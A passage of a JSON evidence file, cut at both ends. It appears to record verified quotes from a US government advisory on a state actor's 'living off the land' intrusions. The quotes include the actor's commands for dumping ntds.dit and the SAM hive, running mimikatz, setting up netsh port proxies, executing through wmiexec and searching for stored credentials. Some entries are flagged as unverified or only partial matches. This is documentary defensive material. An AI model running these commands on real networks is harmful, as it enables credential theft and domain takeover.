+   "quote": "\"cmd.exe /c \"netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=<rfc1918 internal ip address> connectport=8443 protocol=tcp\"\"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "43"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "\"cmd.exe /c \"netsh interface portproxy add v4tov4\n         listenaddress=0.0.0.0 listenport=9999\n         connectaddress=<rfc1918 internal ip address>\n         "
+  },
+  {
+   "id": "evidence-6",
+   "quote": "\"cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=<rfc1918 internal ip address>\"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "45"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "\"cmd.exe /c netsh interface portproxy add v4tov4\n         listenport=50100 listenaddress=0.0.0.0 connectport=1433\n         connectaddress=<rfc1918 internal ip a"
+  },
+  {
+   "id": "evidence-7",
+   "quote": "The actor has used the following PowerShell command to identify successful logons to the host: Get-EventLog security -instanceid 4624",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "54"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.6429,
+   "matched_text": "The actor has used the following PowerShell command to identify successful logons to the host:"
+  },
+  {
+   "id": "evidence-8",
+   "quote": "The actor regularly employs the use of Impacket’s wmiexec, which redirects output to a file within the victim host’s ADMIN$ share (C:\\Windows\\) containing an epoch timestamp in its name. The following is an example of the “dir” command being executed by wmiexec.py: cmd.exe /Q /c dir 1> \\\\127.0.0.1\\ADMIN$\\__1684956600.123456 2>&1",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "59"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.7143,
+   "matched_text": "The actor regularly employs the use of Impacket’s wmiexec, which redirects output to a file within the victim host’s ADMIN$ share (C:\\Windows\\) containing an ep"
+  },
+  {
+   "id": "evidence-9",
+   "quote": "The following commands were used by the actor to enumerate the network topology, the active directory structure, and other information about the target environment,: arp -a curl www.ip-api.com dnscmd . /enumrecords /zone {REDACTED} dnscmd . /enumzones dnscmd /enumrecords {REDACTED} . /additional ipconfig /all ldifde.exe -f c:\\windows\\temp\\<filename>.txt -p subtree net localgroup administrators net group /dom net group \"Domain Admins\" /dom netsh interface firewall show all netsh interface portproxy show all netsh interface portproxy show v4tov4 netsh firewall show all netsh portproxy show v4tov4 netstat -ano reg query hklm\\software\\ systeminfo tasklist /v whoami wmic volume list brief wmic service brief wmic product list brief wmic baseboard list full wevtutil qe security /rd:true /f:text /q:*[System[(EventID=4624) and TimeCreated[@SystemTime>='{REDACTED}']] and EventData[Data='{REDACTED}']]",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "63"
+   },
+   "quote_verified": false,
+   "quote_match": "none",
+   "match_score": 0.0,
+   "matched_text": "The following commands were used by the actor to enumerate the network topology, the active directory structure, and other information about the target environm"
+  },
+  {
+   "id": "evidence-10",
+   "quote": "The actor also used the following commands to identify additional opportunities for obtaining credentials in the environment,: dir C:\\Users\\{REDACTED}\\.ssh\\known_hosts dir C:\\users\\{REDACTED}\\appdata\\roaming\\Mozilla\\firefox\\profiles mimikatz.exe reg query hklm\\software\\OpenSSH reg query hklm\\software\\OpenSSH\\Agent reg query hklm\\software\\realvnc reg query hklm\\software\\realvnc\\vncserver reg query hklm\\software\\realvnc\\Allusers reg query hklm\\software\\realvnc\\Allusers\\vncserver reg query hkcu\\software\\{REDACTED}\\putty\\session reg save hklm\\sam ss.dat reg save hklm\\system sy.dat",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "67"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.9036,
+   "matched_text": "s mimikatz.exe reg query hklm\\software\\OpenSSH reg query hklm\\software\\OpenSSH\\Agent reg query hklm\\software\\realvnc reg query hklm\\software\\realvnc\\vncserver r"
+  },
+  {
+   "id": "evidence-11",
+   "quote": "The actor executed the following additional commands: 7z.exe a -p {REDACTED} c:\\windows\\temp\\{REDACTED}.7z C:\\Windows\\system32\\pcwrun.exe C:\\Users\\Administrator\\Desktop\\Win.exe C:\\Windows\\System32\\cmdbak.exe /c ping -n 1 127.0.0.1 > C:\\Windows\\temp\\putty.log C:\\Windows\\Temp\\tmp.log \"cmd.exe\" /c dir \\\\127.0.0.1\\C$ /od \"cmd.exe\" /c ping –a –n 1 <IP address> \"cmd.exe\" /c wmic /user:<username> /password:<password> process call create \"net stop \\\"<service name>\\\" > C:\\Windows\\Temp\\tmp.log\" cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1 net use \\\\127.0.0.1\\IPC$ /y /d powershell start-process -filepath c:\\windows\\temp\\<filename>.bat -windowstyle Hidden rar.exe a –{REDACTED} c:\\Windows\\temp\\{REDACTED} D:\\{REDACTED}\\ wmic /node:{REDACTED} /user:{REDACTED} /password:{REDACTED} cmd /c whoami xcopy C:\\windows\\temp\\hp d:\\{REDACTED}",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "68"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.8027,
+   "matched_text": "7z.exe a p {REDACTED} c:\\windows\\temp\\{REDACTED}.7z C:\\Windows\\system32\\pcwrun.exe C:\\Users\\Administrator\\Desktop\\Win.exe C:\\Windows\\System32\\cmdbak.exe /c ping"
+  },
+  {
+   "id": "evidence-12",
+   "quote": "The built-in Ntdsutil.exe tool performs all these actions using a single command. There are several ways to execute Ntdsutil.exe, including running from an elevated command prompt (cmd.exe), using WMI/WMIC, or PowerShell.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "27"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The built in Ntdsutil.exe tool performs all these actions using a single command. There are several ways to execute Ntdsutil.exe, including running from an elev"
+  },
+  {
+   "id": "evidence-13",
+   "quote": "netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress={REDACTED} connectport=8443 protocol=tcp",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "95"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress={REDACTED} connectport=8443 protocol=tcp"
+  },
+  {
+   "id": "evidence-14",
+   "quote": "Get-EventLog security -instanceid 4624",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "95"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Get EventLog security instanceid 4624"
+  },
+  {
+   "id": "evidence-15",
+   "quote": "cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "70"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1"
+  },
+  {
+   "id": "evidence-16",
+   "quote": "The actor may try to exfiltrate the ntds.dit file and the SYSTEM registry hive from Windows domain controllers (DCs) out of the network to perform password cracking",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "24"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The actor may try to exfiltrate the ntds.dit file and the SYSTEM registry hive from Windows domain controllers (DCs) out of the network to perform password crac"
+  },
+  {
+   "id": "evidence-17",
+   "quote": "Best practices for securing ntds.dit include hardening Domain Controllers and monitoring event logs for ntdsutil.exe and similar process creations",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "41"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Best practices for securing ntds.dit include hardening Domain Controllers and monitoring event logs for ntdsutil.exe and similar process creations"
+  },
+  {
+   "id": "evidence-18",
+   "quote": "If an actor can exfiltrate the ntds.dit and SYSTEM registry hive, the entire domain should be considered compromised",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "39"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "If an actor can exfiltrate the ntds.dit and SYSTEM registry hive, the entire domain should be considered compromised"
+  },
+  {
+   "id": "evidence-19",
+   "quote": "The actor has leveraged compromised small office/home office (SOHO) network devices as intermediate infrastructure to obscure their activity by having much of the command and control (C2) traffic emanate from local ISPs in the geographic area of the victim",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The actor has leveraged compromised small office/home office (SOHO) network devices as intermediate infrastructure to obscure their activity by having much of t"
+  },
+  {
+   "id": "evidence-20",
+   "quote": "The actor is known to target perimeter devices in their operations",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "53"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The actor is known to target perimeter devices in their operations"
+  },
+  {
+   "id": "evidence-21",
+   "quote": "One of the actor’s primary tactics, techniques, and procedures (TTPs) is living off the land, which uses built-in network administration tools to perform their objectives. Some of the built-in tools this actor uses are: wmic, ntdsutil, netsh, and PowerShell",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "7"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "One of the actor’s primary tactics, techniques, and procedures (TTPs) is living off the land, which uses built in network administration tools to perform their "
+  },
+  {
+   "id": "evidence-22",
+   "quote": "The actor has executed the following command to gather information about local drives: cmd.exe /C \"wmic path win32_logicaldisk get caption,filesystem,freespace,size,volumename\"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "20"
+   },
+   "quote_verified": false,
+   "quote_match": "none",
+   "match_score": 0.0,
+   "matched_text": "The actor has executed the following command to gather information about local drives:"
+  },
+  {
+   "id": "evidence-23",
+   "quote": "The actor has used the following commands to enable port forwarding on the host: \"cmd.exe /c \"netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=<rfc1918 internal ip address> connectport=8443 protocol=tcp\"\"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "43"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.75,
+   "matched_text": "\"cmd.exe /c \"netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=<rfc1918 internal ip address> connectport=8443 protocol=t"
+  },
+  {
+   "id": "evidence-24",
+   "quote": "The actor has used the following PowerShell command to identify successful logons to the host: Get-EventLog security -instanceid 4624",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "54"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.6429,
+   "matched_text": "The actor has used the following PowerShell command to identify successful logons to the host:"
+  },
+  {
+   "id": "evidence-25",
+   "quote": "The actor regularly employs the use of Impacket’s wmiexec, which redirects output to a file within the victim host’s ADMIN$ share (C:\\Windows\\) containing an epoch timestamp in its name",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "59"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The actor regularly employs the use of Impacket’s wmiexec, which redirects output to a file within the victim host’s ADMIN$ share (C:\\Windows\\) containing an ep"
+  },
+  {
+   "id": "evidence-26",
+   "quote": "The built-in Ntdsutil.exe tool performs all these actions using a single command",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "27"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The built in Ntdsutil.exe tool performs all these actions using a single command"
+  },
+  {
+   "id": "evidence-27",
+   "quote": "Note: This script is a component of Impacket, which the actor has been known to use",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "41"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Note: This script is a component of Impacket, which the actor has been known to use"
+  },
+  {
+   "id": "evidence-28",
+   "quote": "The actor regularly employs the use of Impacket’s wmiexec",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "59"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The actor regularly employs the use of Impacket’s wmiexec"
+  },
+  {
+   "id": "evidence-29",
+   "quote": "Commands including ... mimikatz.exe ...",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "67"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.75,
+   "matched_text": " mimikatz.exe "
+  },
+  {
+   "id": "evidence-30",
+   "quote": "powershell start-process -filepath c:\\windows\\temp\\<filename>.bat -windowstyle Hidden",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "70"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "powershell start process filepath c:\\windows\\temp\\<filename>.bat windowstyle Hidden"
+  },
+  {
+   "id": "evidence-31",
+   "quote": "redirects output to a file within the victim host’s ADMIN$ share (C:\\Windows\\) containing an epoch timestamp in its name",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "59"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "redirects output to a file within the victim host’s ADMIN$ share (C:\\Windows\\) containing an epoch timestamp in its name"
+  },
+  {
+   "id": "evidence-32",
+   "quote": "www.cisa.gov",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "87"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "www.cisa.gov"
+  },
+  {
+   "id": "evidence-33",
+   "quote": "www.ic3.gov",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "87"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "www.ic3.gov"
+  },
+  {
+   "id": "evidence-34",
+   "quote": "CVE-2021-40539",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "87"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2021 40539"
+  },
+  {
+   "id": "evidence-35",
+   "quote": "CVE-2021-27860",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "87"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2021 27860"
+  },
+  {
+   "id": "evidence-36",
+   "quote": "f4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "101"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "f4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd"
+  },
+  {
+   "id": "evidence-37",
+   "quote": "ef09b8ff86c276e9b475a6ae6b54f08ed77e09e169f7fc0872eb1d427ee27d31",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "101"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "ef09b8ff86c276e9b475a6ae6b54f08ed77e09e169f7fc0872eb1d427ee27d31"
+  },
+  {
+   "id": "evidence-38",
+   "quote": "d6ebde42457fe4b2a927ce53fc36f465f0000da931cfab9b79a36083e914ceca",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "101"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "d6ebde42457fe4b2a927ce53fc36f465f0000da931cfab9b79a36083e914ceca"
+  },
+  {
+   "id": "evidence-39",
+   "quote": "472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "103"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d"
+  },
+  {
+   "id": "evidence-40",
+   "quote": "66a19f7d2547a8a85cee7a62d0b6114fd31afdee090bd43f36b89470238393d7",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "103"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "66a19f7d2547a8a85cee7a62d0b6114fd31afdee090bd43f36b89470238393d7"
+  },
+  {
+   "id": "evidence-41",
+   "quote": "3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "103"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71"
+  },
+  {
+   "id": "evidence-42",
+   "quote": "41e5181b9553bbe33d91ee204fe1d2ca321ac123f9147bb475c0ed32f9488597",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "103"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "41e5181b9553bbe33d91ee204fe1d2ca321ac123f9147bb475c0ed32f9488597"
+  },
+  {
+   "id": "evidence-43",
+   "quote": "c7fee7a3ffaf0732f42d89c4399cbff219459ae04a81fc6eff7050d53bd69b99",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "103"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "c7fee7a3ffaf0732f42d89c4399cbff219459ae04a81fc6eff7050d53bd69b99"
+  },
+  {
+   "id": "evidence-44",
+   "quote": "3a9d8bb85fbcfe92bae79d5ab18e4bca9eaf36cea70086e8d1ab85336c83945f",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "103"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "3a9d8bb85fbcfe92bae79d5ab18e4bca9eaf36cea70086e8d1ab85336c83945f"
+  },
+  {
+   "id": "evidence-45",
+   "quote": "fe95a382b4f879830e2666473d662a24b34fccf34b6b3505ee1b62b32adafa15",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "103"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "fe95a382b4f879830e2666473d662a24b34fccf34b6b3505ee1b62b32adafa15"
+  },
+  {
+   "id": "evidence-46",
+   "quote": "ee8df354503a56c62719656fae71b3502acf9f87951c55ffd955feec90a11484",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "103"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "ee8df354503a56c62719656fae71b3502acf9f87951c55ffd955feec90a11484"
+  },
+  {
+   "id": "evidence-47",
+   "quote": "https://learn.microsoft.com/en-us/windows-server/identity/ad-",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "114"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "https://learn.microsoft.com/en us/windows server/identity/ad"
+  },
+  {
+   "id": "evidence-48",
+   "quote": "https://learn.microsoft.com/en-us/windows-server/identity/ad-",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "117"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "https://learn.microsoft.com/en us/windows server/identity/ad"
+  },
+  {
+   "id": "evidence-49",
+   "quote": "learn.microsoft.com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "114"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "learn.microsoft.com"
+  },
+  {
+   "id": "evidence-50",
+   "quote": "learn.microsoft.com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "116"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "learn.microsoft.com"
+  },
+  {
+   "id": "evidence-51",
+   "quote": "learn.microsoft.com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "117"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "learn.microsoft.com"
+  },
+  {
+   "id": "evidence-52",
+   "quote": "https://learn.microsoft.com/en-us/previous-versions/windows/it-",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "116"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "https://learn.microsoft.com/en us/previous versions/windows/it"
+  },
+  {
+   "id": "evidence-53",
+   "quote": "https://media.defense.gov/2022/Jun/22/2003021689/-1/-",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "116"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "https://media.defense.gov/2022/Jun/22/2003021689/ 1/"
+  },
+  {
+   "id": "evidence-54",
+   "quote": "www.microsoft.com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "116"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "www.microsoft.com"
+  },
+  {
+   "id": "evidence-55",
+   "quote": "media.defense.gov",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "116"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "media.defense.gov"
+  },
+  {
+   "id": "evidence-56",
+   "quote": "www.mandiant.com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "116"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "www.mandiant.com"
+  },
+  {
+   "id": "evidence-57",
+   "quote": "www.fbi.gov",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "123"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "www.fbi.gov"
+  },
+  {
+   "id": "evidence-58",
+   "quote": "cmd.exe /C \"wmic path win32_logicaldisk get caption,filesystem,freespace,size,volumename\"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "21"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /C \"wmic path win32_logicaldisk get\n      caption,filesystem,freespace,size,volumename\""
+  },
+  {
+   "id": "evidence-59",
+   "quote": "cmd /c vssadmin create shadow /for=C: > C:\\Windows\\Temp\\<filename>.tmp",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "26"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd /c vssadmin create shadow /for=C: > C:\\Windows\\Temp\\<filename>.tmp"
+  },
+  {
+   "id": "evidence-60",
+   "quote": "cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\NTD S\\ntds.dit C:\\Windows\\Temp > C:\\Windows\\Temp\\<filename>.tmp",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "26"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\NTD S\\ntds.dit C:\\Windows\\Temp > C:\\Windows\\Temp\\<filename>.tmp"
+  },
+  {
+   "id": "evidence-61",
+   "quote": "cmd.exe /c ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\Pro\" wmic process call create \"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "29"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\Pro\" wmic process call create \""
+  },
+  {
+   "id": "evidence-62",
+   "quote": "cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\" \"cmd.exe\" /c wmic process call create \"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "29"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\" \"cmd.exe\" /c wmic process call create \""
+  },
+  {
+   "id": "evidence-63",
+   "quote": "cmd.exe /c mkdir C:\\windows\\Temp\\McAfee_Logs & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\McAfee_Logs\\\"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "29"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c mkdir C:\\windows\\Temp\\McAfee_Logs & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\McAfee_Logs\\\""
+  },
+  {
+   "id": "evidence-64",
+   "quote": "cmd.exe /c mkdir C:\\windows\\Temp\\McAfee_Logs & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\McAfee_Logs\\\"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "95"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c mkdir C:\\windows\\Temp\\McAfee_Logs & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\McAfee_Logs\\\""
+  },
+  {
+   "id": "evidence-65",
+   "quote": "cmd.exe /Q /c wmic process call create \"cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\" 1> \\\\127.0.0.1\\ADMIN$\\<timestamp value> 2>&1",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "31"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /Q /c wmic process call create \"cmd.exe /c mkdir\n         C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create\n         full C:\\Windows\\Temp\\tmp\\\" "
+  },
+  {
+   "id": "evidence-66",
+   "quote": "cmd.exe /c \"netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=<rfc1918 internal ip address> connectport=8443 protocol=tcp\"\"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "43"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c \"netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=<rfc1918 internal ip address> connectport=8443 protocol=tc"
+  },
+  {
+   "id": "evidence-67",
+   "quote": "cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=<rfc1918 internal ip address>\"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "45"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=<rfc1918 internal ip address>\""
+  },
+  {
+   "id": "evidence-68",
+   "quote": "PowerShell command to identify",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "54"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "PowerShell command to identify"
+  },
+  {
+   "id": "evidence-69",
+   "quote": "cmd.exe /Q /c dir 1> \\\\127.0.0.1\\ADMIN$\\__1684956600.123456 2>&1",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "61"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /Q /c dir 1>\n         \\\\127.0.0.1\\ADMIN$\\__1684956600.123456 2>&1"
+  },
+  {
+   "id": "evidence-70",
+   "quote": "cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1 net use \\\\127.0.0.1\\IPC$ /y /d",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "70"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1 net use \\\\127.0.0.1\\IPC$ /y /d"
+  },
+  {
+   "id": "evidence-71",
+   "quote": "powershell start-process -filepath c:\\windows\\temp\\<filename>.bat -windowstyle Hidden rar.exe a –{REDACTED} c:\\Windows\\temp\\{REDACTED} D:\\{REDACTED}\\ wmic /node:{REDACTED} /user:{REDACTED} /password:{REDACTED}",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "70"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "powershell start process filepath c:\\windows\\temp\\<filename>.bat windowstyle Hidden rar.exe a {REDACTED} c:\\Windows\\temp\\{REDACTED} D:\\{REDACTED}\\ wmic /node:{R"
+  },
+  {
+   "id": "evidence-72",
+   "quote": "cmd /c whoami xcopy C:\\windows\\temp\\hp d:\\{REDACTED}",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "70"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd /c whoami xcopy C:\\windows\\temp\\hp d:\\{REDACTED}"
+  },
+  {
+   "id": "evidence-73",
